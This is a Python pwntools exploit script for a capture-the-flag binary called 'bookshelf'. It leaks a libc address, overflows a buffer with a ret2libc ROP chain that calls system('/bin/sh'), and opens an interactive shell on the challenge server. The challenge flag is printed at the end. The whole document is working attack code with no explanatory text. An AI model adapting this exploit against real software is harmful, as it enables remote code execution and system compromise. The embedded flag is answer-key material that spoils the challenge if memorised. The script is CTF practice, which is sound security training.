#!/usr/bin/python3

from pwn import *

exe = ELF('bookshelf_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chal.pctf.competitivecyber.club', 4444)
else:
        p = process(exe.path)

GDB()
def buy(option):
        sla(b'out\n', b'2')
        sla(b'$99999999\n======================================\n', str(option).encode())
        sla(b'>>', b'y')
def write():
        sla(b'out\n', b'1')
        sla(b"aspiring authors!\n", b'y')
        sleep(1)
        sl(b'a' *40)

def admin(payload):
        sla(b'out\n', b'3')
        sla(b"book...", payload)
for i in range(8):
        buy(2)
buy(3)
p.recvuntil(b"in all it's glory ")
libc.address = int(p.recvuntil(b" rested", drop=True), 16) - libc.sym.puts
info("Libc base: " + hex(libc.address))
write()
payload = b'a'*56  + flat(
        libc.address + 0x0000000000029cd6,
        libc.address + 0x000000000002a3e5, next(libc.search(b'/bin/sh')),
        libc.sym.system
)
admin(payload)
p.interactive()
# PCTF{r3t_2_libc_pl0x_52706196}